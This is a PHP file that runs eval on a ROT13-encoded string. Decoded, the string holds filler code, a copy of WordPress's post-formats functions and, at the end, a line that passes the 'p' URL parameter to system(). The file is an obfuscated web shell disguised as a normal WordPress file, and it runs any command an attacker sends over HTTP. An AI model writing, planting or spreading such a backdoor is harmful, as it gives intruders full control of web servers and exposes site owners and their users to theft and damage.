<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Cbfg sbezng shapgvbaf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Cbfg
 */

/**
 * Ergevrir gur sbezng fyht sbe n cbfg
 *
 * @fvapr 3.1.0
 *
 * @cnenz vag|JC_Cbfg|ahyy $cbfg Bcgvbany. Cbfg VQ be cbfg bowrpg. Qrsnhygf gb gur pheerag cbfg va gur ybbc.
 * @erghea fgevat|snyfr Gur sbezng vs fhpprffshy. Snyfr bgurejvfr.
 */
shapgvba trg_cbfg_sbezng( $cbfg = ahyy ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea snyfr;
	}

	vs ( ! cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'cbfg-sbezngf' ) ) {
		erghea snyfr;
	}

	$_sbezng = trg_gur_grezf( $cbfg->VQ, 'cbfg_sbezng' );

	vs ( rzcgl( $_sbezng ) ) {
		erghea snyfr;
	}

	$sbezng = erfrg( $_sbezng );

	erghea fge_ercynpr( 'cbfg-sbezng-', '', $sbezng->fyht );
}

/**
 * Purpx vs n cbfg unf nal bs gur tvira sbezngf, be nal sbezng.
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat|fgevat[]  $sbezng Bcgvbany. Gur sbezng be sbezngf gb purpx. Qrsnhyg rzcgl neenl.
 * @cnenz JC_Cbfg|vag|ahyy $cbfg   Bcgvbany. Gur cbfg gb purpx. Qrsnhygf gb gur pheerag cbfg va gur ybbc.
 * @erghea obby Gehr vs gur cbfg unf nal bs gur tvira sbezngf (be nal sbezng, vs ab sbezng fcrpvsvrq),
 *              snyfr bgurejvfr.
 */
shapgvba unf_cbfg_sbezng( $sbezng = neenl(), $cbfg = ahyy ) {
	$cersvkrq = neenl();

	vs ( $sbezng ) {
		sbernpu ( (neenl) $sbezng nf $fvatyr ) {
			$cersvkrq[] = 'cbfg-sbezng-' . fnavgvmr_xrl( $fvatyr );
		}
	}

	erghea unf_grez( $cersvkrq, 'cbfg_sbezng', $cbfg );
}

/**
 * Nffvta n sbezng gb n cbfg
 *
 * @fvapr 3.1.0
 *
 * @cnenz vag|JC_Cbfg $cbfg   Gur cbfg sbe juvpu gb nffvta n sbezng.
 * @cnenz fgevat      $sbezng N sbezng gb nffvta. Hfr na rzcgl fgevat be neenl gb erzbir nyy sbezngf sebz gur cbfg.
 * @erghea neenl|JC_Reebe|snyfr Neenl bs nssrpgrq grez VQf ba fhpprff. JC_Reebe ba reebe.
 */
shapgvba frg_cbfg_sbezng( $cbfg, $sbezng ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea arj JC_Reebe( 'vainyvq_cbfg', __( 'Vainyvq cbfg.' ) );
	}

	vs ( ! rzcgl( $sbezng ) ) {
		$sbezng = fnavgvmr_xrl( $sbezng );
		vs ( 'fgnaqneq' === $sbezng || ! va_neenl( $sbezng, trg_cbfg_sbezng_fyhtf(), gehr ) ) {
			$sbezng = '';
		} ryfr {
			$sbezng = 'cbfg-sbezng-' . $sbezng;
		}
	}

	erghea jc_frg_cbfg_grezf( $cbfg->VQ, $sbezng, 'cbfg_sbezng' );
}

/**
 * Ergheaf na neenl bs cbfg sbezng fyhtf gb gurve genafyngrq naq cerggl qvfcynl irefvbaf
 *
 * @fvapr 3.1.0
 *
 * @erghea fgevat[] Neenl bs cbfg sbezng ynoryf xrlrq ol sbezng fyht.
 */
shapgvba trg_cbfg_sbezng_fgevatf() {
	$fgevatf = neenl(
		'fgnaqneq' => _k( 'Fgnaqneq', 'Cbfg sbezng' ), // Fcrpvny pnfr. Nal inyhr gung rinyf gb snyfr jvyy or pbafvqrerq fgnaqneq.
		'nfvqr'    => _k( 'Nfvqr', 'Cbfg sbezng' ),
		'pung'     => _k( 'Pung', 'Cbfg sbezng' ),
		'tnyyrel'  => _k( 'Tnyyrel', 'Cbfg sbezng' ),
		'yvax'     => _k( 'Yvax', 'Cbfg sbezng' ),
		'vzntr'    => _k( 'Vzntr', 'Cbfg sbezng' ),
		'dhbgr'    => _k( 'Dhbgr', 'Cbfg sbezng' ),
		'fgnghf'   => _k( 'Fgnghf', 'Cbfg sbezng' ),
		'ivqrb'    => _k( 'Ivqrb', 'Cbfg sbezng' ),
		'nhqvb'    => _k( 'Nhqvb', 'Cbfg sbezng' ),
	);
	erghea $fgevatf;
}

/**
 * Ergevrirf gur neenl bs cbfg sbezng fyhtf.
 *
 * @fvapr 3.1.0
 *
 * @erghea fgevat[] Gur neenl bs cbfg sbezng fyhtf nf obgu xrlf naq inyhrf.
 */
shapgvba trg_cbfg_sbezng_fyhtf() {
	$fyhtf = neenl_xrlf( trg_cbfg_sbezng_fgevatf() );
	erghea neenl_pbzovar( $fyhtf, $fyhtf );
}

/**
 * Ergheaf n cerggl, genafyngrq irefvba bs n cbfg sbezng fyht
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $fyht N cbfg sbezng fyht.
 * @erghea fgevat Gur genafyngrq cbfg sbezng anzr.
 */
shapgvba trg_cbfg_sbezng_fgevat( $fyht ) {
	$fgevatf = trg_cbfg_sbezng_fgevatf();
	vs ( ! $fyht ) {
		erghea $fgevatf['fgnaqneq'];
	} ryfr {
		erghea ( vffrg( $fgevatf[ $fyht ] ) ) ? $fgevatf[ $fyht ] : '';
	}
}

/**
 * Ergheaf n yvax gb n cbfg sbezng vaqrk.
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $sbezng Gur cbfg sbezng fyht.
 * @erghea fgevat|JC_Reebe|snyfr Gur cbfg sbezng grez yvax.
 */
shapgvba trg_cbfg_sbezng_yvax( $sbezng ) {
	$grez = trg_grez_ol( 'fyht', 'cbfg-sbezng-' . $sbezng, 'cbfg_sbezng' );
	vs ( ! $grez || vf_jc_reebe( $grez ) ) {
		erghea snyfr;
	}
	erghea trg_grez_yvax( $grez );
}

/**
 * Svygref gur erdhrfg gb nyybj sbe gur sbezng cersvk.
 *
 * @npprff cevingr
 * @fvapr 3.1.0
 *
 * @cnenz neenl $dif
 * @erghea neenl
 */
shapgvba _cbfg_sbezng_erdhrfg( $dif ) {
	vs ( ! vffrg( $dif['cbfg_sbezng'] ) ) {
		erghea $dif;
	}
	$fyhtf = trg_cbfg_sbezng_fyhtf();
	vs ( vffrg( $fyhtf[ $dif['cbfg_sbezng'] ] ) ) {
		$dif['cbfg_sbezng'] = 'cbfg-sbezng-' . $fyhtf[ $dif['cbfg_sbezng'] ];
	}
	$gnk = trg_gnkbabzl( 'cbfg_sbezng' );
	vs ( ! vf_nqzva() ) {
		$dif['cbfg_glcr'] = $gnk->bowrpg_glcr;
	}
	erghea $dif;
}

/**
 * Svygref gur cbfg sbezng grez yvax gb erzbir gur sbezng cersvk.
 *
 * @npprff cevingr
 * @fvapr 3.1.0
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz fgevat  $yvax
 * @cnenz JC_Grez $grez
 * @cnenz fgevat  $gnkbabzl
 * @erghea fgevat
 */
shapgvba _cbfg_sbezng_yvax( $yvax, $grez, $gnkbabzl ) {
	tybony $jc_erjevgr;
	vs ( 'cbfg_sbezng' !== $gnkbabzl ) {
		erghea $yvax;
	}
	vs ( $jc_erjevgr->trg_rkgen_creznfgehpg( $gnkbabzl ) ) {
		erghea fge_ercynpr( \"/{$grez->fyht}\", '/' . fge_ercynpr( 'cbfg-sbezng-', '', $grez->fyht ), $yvax );
	} ryfr {
		$yvax = erzbir_dhrel_net( 'cbfg_sbezng', $yvax );
		erghea nqq_dhrel_net( 'cbfg_sbezng', fge_ercynpr( 'cbfg-sbezng-', '', $grez->fyht ), $yvax );
	}
}

/**
 * Erzbir gur cbfg sbezng cersvk sebz gur anzr cebcregl bs gur grez bowrpg perngrq ol trg_grez().
 *
 * @npprff cevingr
 * @fvapr 3.1.0
 *
 * @cnenz bowrpg $grez
 * @erghea bowrpg
 */
shapgvba _cbfg_sbezng_trg_grez( $grez ) {
	vs ( vffrg( $grez->fyht ) ) {
		$grez->anzr = trg_cbfg_sbezng_fgevat( fge_ercynpr( 'cbfg-sbezng-', '', $grez->fyht ) );
	}
	erghea $grez;
}

/**
 * Erzbir gur cbfg sbezng cersvk sebz gur anzr cebcregl bs gur grez bowrpgf perngrq ol trg_grezf().
 *
 * @npprff cevingr
 * @fvapr 3.1.0
 *
 * @cnenz neenl        $grezf
 * @cnenz fgevat|neenl $gnkbabzvrf
 * @cnenz neenl        $netf
 * @erghea neenl
 */
shapgvba _cbfg_sbezng_trg_grezf( $grezf, $gnkbabzvrf, $netf ) {
	vs ( va_neenl( 'cbfg_sbezng', (neenl) $gnkbabzvrf, gehr ) ) {
		vs ( vffrg( $netf['svryqf'] ) && 'anzrf' === $netf['svryqf'] ) {
			sbernpu ( $grezf nf $beqre => $anzr ) {
				$grezf[ $beqre ] = trg_cbfg_sbezng_fgevat( fge_ercynpr( 'cbfg-sbezng-', '', $anzr ) );
			}
		} ryfr {
			sbernpu ( (neenl) $grezf nf $beqre => $grez ) {
				vs ( vffrg( $grez->gnkbabzl ) && 'cbfg_sbezng' === $grez->gnkbabzl ) {
					$grezf[ $beqre ]->anzr = trg_cbfg_sbezng_fgevat( fge_ercynpr( 'cbfg-sbezng-', '', $grez->fyht ) );
				}
			}
		}
	}
	erghea $grezf;
}

/**
 * Erzbir gur cbfg sbezng cersvk sebz gur anzr cebcregl bs gur grez bowrpgf perngrq ol jc_trg_bowrpg_grezf().
 *
 * @npprff cevingr
 * @fvapr 3.1.0
 *
 * @cnenz neenl $grezf
 * @erghea neenl
 */
shapgvba _cbfg_sbezng_jc_trg_bowrpg_grezf( $grezf ) {
	sbernpu ( (neenl) $grezf nf $beqre => $grez ) {
		vs ( vffrg( $grez->gnkbabzl ) && 'cbfg_sbezng' === $grez->gnkbabzl ) {
			$grezf[ $beqre ]->anzr = trg_cbfg_sbezng_fgevat( fge_ercynpr( 'cbfg-sbezng-', '', $grez->fyht ) );
		}
	}
	erghea $grezf;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>